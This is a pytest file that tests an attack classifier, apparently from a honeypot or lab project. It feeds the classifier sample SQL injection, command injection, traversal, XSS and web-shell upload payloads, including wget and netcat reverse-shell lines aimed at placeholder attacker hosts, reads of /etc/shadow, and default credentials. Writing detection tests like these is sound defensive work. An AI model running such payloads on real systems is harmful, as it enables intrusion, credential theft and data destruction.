# ============================================================================
# test_classifier.py — Attack Classification Engine Tests
# ============================================================================
# Automates Phase 2 of the Chapter 6 roadmap.
# Tests BOTH classifiers:
#   1. lab_routes.classify_attack(username, password)  — Lab Mode (3 types)
#   2. internet_routes._classify_attack(req, payload)  — Internet Mode (8 types)
#
# Run:  pytest tests/test_classifier.py -v
# ============================================================================

import pytest
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from lab_routes import classify_attack, is_default_credential
from internet_routes import _classify_attack
from tests.conftest import FakeRequest


# ============================================================================
# SECTION A: LAB MODE CLASSIFIER (lab_routes.classify_attack)
# ============================================================================
# The lab classifier handles login form payloads and detects:
# SQL Injection, Command Injection, or Brute Force.
# ============================================================================

class TestLabClassifierSQLi:
    """SQL Injection detection via login form inputs."""

    def test_classic_tautology(self):
        result = classify_attack("' OR '1'='1", "")
        assert result['attack_type'] == 'SQL Injection'
        assert result['mitre_id'] == 'T1190'

    def test_or_1_equals_1_with_comment(self):
        result = classify_attack("' OR 1=1 --", "")
        assert result['attack_type'] == 'SQL Injection'

    def test_admin_comment_bypass(self):
        result = classify_attack("admin'--", "")
        assert result['attack_type'] == 'SQL Injection'

    def test_union_select(self):
        result = classify_attack("' UNION SELECT * FROM users--", "")
        assert result['attack_type'] == 'SQL Injection'

    def test_sleep_based_blind(self):
        result = classify_attack("admin' AND SLEEP(5)--", "")
        assert result['attack_type'] == 'SQL Injection'

    def test_stacked_query_drop(self):
        result = classify_attack("'; DROP TABLE users;--", "")
        assert result['attack_type'] == 'SQL Injection'

    def test_sqli_in_password_field(self):
        result = classify_attack("admin", "' OR '1'='1")
        assert result['attack_type'] == 'SQL Injection'


class TestLabClassifierCmdI:
    """Command Injection detection via login form inputs."""

    def test_semicolon_cat(self):
        result = classify_attack("admin", "; cat /etc/passwd")
        assert result['attack_type'] == 'Command Injection'
        assert result['mitre_id'] == 'T1059'

    def test_pipe_id(self):
        result = classify_attack("admin", "| id")
        assert result['attack_type'] == 'Command Injection'

    def test_command_substitution(self):
        result = classify_attack("$(whoami)", "")
        assert result['attack_type'] == 'Command Injection'

    def test_backtick_execution(self):
        result = classify_attack("`cat /etc/shadow`", "")
        assert result['attack_type'] == 'Command Injection'

    def test_and_chaining(self):
        result = classify_attack("admin", "&& wget attacker.com/shell")
        assert result['attack_type'] == 'Command Injection'

    def test_or_chaining(self):
        result = classify_attack("admin", "|| nc -e /bin/sh 10.0.0.1 4444")
        assert result['attack_type'] == 'Command Injection'


class TestLabClassifierBruteForce:
    """Brute Force detection — the default when no injection is found."""

    def test_simple_credentials(self):
        result = classify_attack("admin", "password123")
        assert result['attack_type'] == 'Brute Force'
        assert result['mitre_id'] == 'T1110'

    def test_default_credential_admin_admin(self):
        result = classify_attack("admin", "admin")
        assert result['attack_type'] == 'Brute Force'
        assert result['technique'] == 'Credential Stuffing'

    def test_default_credential_root_root(self):
        result = classify_attack("root", "root")
        assert result['attack_type'] == 'Brute Force'
        assert result['technique'] == 'Credential Stuffing'

    def test_non_default_is_guessing(self):
        result = classify_attack("john", "s3cretP@ss!")
        assert result['attack_type'] == 'Brute Force'
        assert result['technique'] == 'Password Guessing'

    def test_empty_password(self):
        result = classify_attack("admin", "")
        assert result['attack_type'] == 'Brute Force'


class TestDefaultCredentials:
    """Verify the default credential lookup table."""

    def test_known_defaults(self):
        assert is_default_credential("admin", "admin") is True
        assert is_default_credential("root", "root") is True
        assert is_default_credential("admin", "1234") is True
        assert is_default_credential("ubnt", "ubnt") is True

    def test_case_insensitive(self):
        assert is_default_credential("Admin", "Admin") is True
        assert is_default_credential("ROOT", "ROOT") is True

    def test_non_default(self):
        assert is_default_credential("admin", "xK9#mP2!") is False
        assert is_default_credential("operator", "cisco") is False


# ============================================================================
# SECTION B: INTERNET MODE CLASSIFIER (internet_routes._classify_attack)
# ============================================================================
# The internet classifier handles ALL HTTP traffic and detects 8 types:
# SQLi, Traversal, CmdI, XSS, Upload, Brute Force, Dir Enum, Recon.
# Classifier priority order matters — tested explicitly.
# ============================================================================

class TestInternetSQLi:
    """SQL Injection detection from full HTTP requests."""

    def test_form_sqli_tautology(self):
        req = FakeRequest(path='/login', method='POST')
        payload = {'form_data': {"username": "' OR 1=1--", "password": "x"}}
        assert _classify_attack(req, payload) == "SQL Injection (T1190)"

    def test_union_select_in_query(self):
        req = FakeRequest(path='/search', method='GET')
        payload = {'query_params': {"q": "' UNION SELECT * FROM users--"}}
        assert _classify_attack(req, payload) == "SQL Injection (T1190)"

    def test_sleep_injection(self):
        req = FakeRequest(path='/login', method='POST')
        payload = {'form_data': {"username": "admin' AND SLEEP(5)--"}}
        assert _classify_attack(req, payload) == "SQL Injection (T1190)"

    def test_extractvalue_injection(self):
        req = FakeRequest(path='/login', method='POST')
        payload = {'form_data': {"username": "' AND extractvalue(1,concat(0x7e,version()))--"}}
        assert _classify_attack(req, payload) == "SQL Injection (T1190)"


class TestInternetTraversal:
    """Directory Traversal detection — must be checked BEFORE CmdI."""

    def test_dot_dot_slash(self):
        req = FakeRequest(path='/../../etc/passwd', method='GET')
        assert _classify_attack(req, {}) == "Directory Traversal (T1083)"

    def test_encoded_traversal(self):
        req = FakeRequest(path='/%2e%2e/%2e%2e/etc/passwd', method='GET')
        assert _classify_attack(req, {}) == "Directory Traversal (T1083)"

    def test_layer2_etc_passwd_without_dotdot(self):
        """
        Layer 2 detection: curl normalizes ../ client-side, so the path
        arrives as /etc/passwd without the traversal prefix.
        The classifier catches this via sensitive file target matching.
        """
        req = FakeRequest(path='/etc/passwd', method='GET')
        assert _classify_attack(req, {}) == "Directory Traversal (T1083)"

    def test_layer2_etc_shadow(self):
        req = FakeRequest(path='/etc/shadow', method='GET')
        assert _classify_attack(req, {}) == "Directory Traversal (T1083)"

    def test_windows_traversal(self):
        req = FakeRequest(path='/..\\..\\windows\\win.ini', method='GET')
        assert _classify_attack(req, {}) == "Directory Traversal (T1083)"

    def test_proc_self(self):
        req = FakeRequest(path='/proc/self/environ', method='GET')
        assert _classify_attack(req, {}) == "Directory Traversal (T1083)"


class TestInternetCmdI:
    """Command Injection detection — must NOT match traversal paths."""

    def test_semicolon_cat_with_space(self):
        req = FakeRequest(path='/login', method='POST')
        payload = {'form_data': {"password": "; cat /etc/hosts"}}
        assert _classify_attack(req, payload) == "Command Injection (T1059)"

    def test_semicolon_cat_no_space(self):
        """No-space variant — real attackers skip spaces."""
        req = FakeRequest(path='/login', method='POST')
        payload = {'form_data': {"password": ";cat /etc/hosts"}}
        assert _classify_attack(req, payload) == "Command Injection (T1059)"

    def test_pipe_id(self):
        req = FakeRequest(path='/login', method='POST')
        payload = {'form_data': {"password": "| id"}}
        assert _classify_attack(req, payload) == "Command Injection (T1059)"

    def test_wget_download(self):
        req = FakeRequest(path='/login', method='POST')
        payload = {'form_data': {"password": "; wget http://evil.com/shell.sh"}}
        assert _classify_attack(req, payload) == "Command Injection (T1059)"

    def test_backtick_whoami(self):
        req = FakeRequest(path='/login', method='POST')
        payload = {'form_data': {"password": "`whoami`"}}
        assert _classify_attack(req, payload) == "Command Injection (T1059)"


class TestInternetXSS:
    """Cross-Site Scripting detection."""

    def test_script_tag(self):
        req = FakeRequest(path='/login', method='POST')
        payload = {'form_data': {"username": "<script>alert(1)</script>"}}
        assert _classify_attack(req, payload) == "XSS (T1059.007)"

    def test_img_onerror(self):
        req = FakeRequest(path='/login', method='POST')
        payload = {'form_data': {"username": '<img src=x onerror=alert(1)>'}}
        assert _classify_attack(req, payload) == "XSS (T1059.007)"

    def test_javascript_protocol(self):
        req = FakeRequest(path='/login', method='POST')
        payload = {'form_data': {"username": "javascript:alert(document.cookie)"}}
        assert _classify_attack(req, payload) == "XSS (T1059.007)"

    def test_svg_onload(self):
        req = FakeRequest(path='/login', method='POST')
        payload = {'form_data': {"username": '<svg onload=alert(1)>'}}
        assert _classify_attack(req, payload) == "XSS (T1059.007)"


class TestInternetUpload:
    """Malicious File Upload detection (POST + file extension)."""

    def test_php_webshell(self):
        req = FakeRequest(path='/upload', method='POST')
        payload = {'form_data': {"file": "shell.php"}}
        assert _classify_attack(req, payload) == "Malicious Upload (T1105)"

    def test_jsp_upload(self):
        req = FakeRequest(path='/upload', method='POST')
        payload = {'form_data': {"file": "backdoor.jsp"}}
        assert _classify_attack(req, payload) == "Malicious Upload (T1105)"

    def test_php_content_in_body(self):
        req = FakeRequest(path='/upload', method='POST')
        payload = {'raw_body': '<?php system($_GET["cmd"]); ?>'}
        assert _classify_attack(req, payload) == "Malicious Upload (T1105)"

    def test_get_with_php_is_not_upload(self):
        """GET requests should NOT trigger upload detection."""
        req = FakeRequest(path='/shell.php', method='GET')
        assert _classify_attack(req, {}) != "Malicious Upload (T1105)"


class TestInternetBruteForce:
    """Brute Force detection — POST to login paths."""

    def test_post_to_root_login(self):
        req = FakeRequest(path='/', method='POST')
        payload = {'form_data': {"username": "admin", "password": "pass123"}}
        assert _classify_attack(req, payload) == "Brute Force (T1110)"

    def test_post_to_login_path(self):
        req = FakeRequest(path='/login', method='POST')
        payload = {'form_data': {"username": "admin", "password": "test"}}
        assert _classify_attack(req, payload) == "Brute Force (T1110)"

    def test_get_to_login_is_not_brute(self):
        """GET requests to login should NOT be brute force."""
        req = FakeRequest(path='/login', method='GET')
        assert _classify_attack(req, {}) != "Brute Force (T1110)"


class TestInternetDirEnum:
    """Directory Enumeration detection — probing known sensitive paths."""

    def test_wp_admin(self):
        req = FakeRequest(path='/wp-admin', method='GET')
        assert _classify_attack(req, {}) == "Directory Enumeration (T1083)"

    def test_phpmyadmin(self):
        req = FakeRequest(path='/phpmyadmin', method='GET')
        assert _classify_attack(req, {}) == "Directory Enumeration (T1083)"

    def test_dot_env(self):
        req = FakeRequest(path='/.env', method='GET')
        assert _classify_attack(req, {}) == "Directory Enumeration (T1083)"

    def test_dot_git(self):
        req = FakeRequest(path='/.git', method='GET')
        assert _classify_attack(req, {}) == "Directory Enumeration (T1083)"

    def test_config_bin(self):
        req = FakeRequest(path='/config.bin', method='GET')
        assert _classify_attack(req, {}) == "Directory Enumeration (T1083)"


class TestInternetRecon:
    """Reconnaissance detection — scanner user-agents and catch-all."""

    def test_nmap_user_agent(self):
        req = FakeRequest(path='/', method='GET', user_agent='Nmap Scripting Engine')
        assert _classify_attack(req, {}) == "Reconnaissance (T1595)"

    def test_nikto_user_agent(self):
        req = FakeRequest(path='/random', method='GET', user_agent='Nikto/2.1.6')
        assert _classify_attack(req, {}) == "Reconnaissance (T1595)"

    def test_sqlmap_user_agent(self):
        req = FakeRequest(path='/', method='GET', user_agent='sqlmap/1.7')
        assert _classify_attack(req, {}) == "Reconnaissance (T1595)"

    def test_unknown_path_is_recon(self):
        """Any unknown GET path with a normal UA defaults to Recon."""
        req = FakeRequest(path='/some/random/page', method='GET')
        assert _classify_attack(req, {}) == "Reconnaissance (T1595)"


# ============================================================================
# SECTION C: CLASSIFIER PRIORITY ORDER TESTS
# ============================================================================
# These tests verify that the classifier ordering is correct.
# Traversal MUST be checked before CmdI to prevent misclassification.
# SQLi MUST be checked before everything else.
# ============================================================================

class TestClassifierPriority:
    """Verify classifier priority chain: SQLi → Traversal → CmdI → XSS → ..."""

    def test_sqli_beats_cmdi(self):
        """Input with both SQL and shell syntax should classify as SQLi."""
        req = FakeRequest(path='/login', method='POST')
        payload = {'form_data': {"username": "' OR 1=1; cat /etc/passwd--"}}
        assert _classify_attack(req, payload) == "SQL Injection (T1190)"

    def test_traversal_beats_cmdi(self):
        """
        Path containing /etc/passwd should be Traversal, not CmdI.
        This was a real bug that was fixed by moving Traversal above CmdI.
        """
        req = FakeRequest(path='/../../../../etc/passwd', method='GET')
        result = _classify_attack(req, {})
        assert result == "Directory Traversal (T1083)", \
            f"Expected Traversal but got {result} — classifier priority may be wrong"

    def test_sqli_beats_brute_force(self):
        """POST to /login with SQLi payload should be SQLi, not Brute Force."""
        req = FakeRequest(path='/login', method='POST')
        payload = {'form_data': {"username": "' OR '1'='1", "password": "x"}}
        assert _classify_attack(req, payload) == "SQL Injection (T1190)"

    def test_scanner_ua_beats_dir_enum(self):
        """Nmap scanning /wp-admin should be Recon (UA match happens last but
        dir enum also matches — actual priority depends on implementation)."""
        req = FakeRequest(path='/random-path', method='GET', user_agent='Nmap/7.94')
        # Scanner UA check happens at position 8, so a random path + nmap UA = Recon
        assert _classify_attack(req, {}) == "Reconnaissance (T1595)"